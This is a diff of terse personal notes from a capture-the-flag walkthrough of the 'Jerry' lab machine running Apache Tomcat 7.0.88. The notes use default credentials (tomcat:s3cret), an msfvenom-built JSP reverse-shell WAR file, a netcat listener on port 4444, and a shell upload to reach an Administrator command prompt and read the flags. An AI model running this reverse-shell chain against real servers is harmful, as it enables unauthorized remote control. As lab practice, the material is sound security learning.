@@ -355,5 +355,25 @@ tirar URL encode do rodapé
 
 Start attack
 look for 200
-dG9tY2F0OnMzY3JldA== -> tomcat s3cret
+dG9tY2F0OnMzY3JldA== -> tomcat:s3cret
+
+login na web page:
+war file upload
+Goo war file reverse shell
+Apache Tomcat/7.0.88 	1.8.0_171-b11 	Oracle Corporation 	Windows Server 2012 R2 	6.3 	amd64 	JERRY 	10.10.10.95
+
+https://netsec.ws/?p=331
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+listen with netcat
+
+nc -nvlp 4444
+
+upload shell.war Tomcat
+http://10.10.10.95:8080/shell/
+
+C:\apache-tomcat-7.0.88>
+whoami
+cd Users\Administrator\Desktop\flags
+
+type "2 for the price of 1.txt"
 
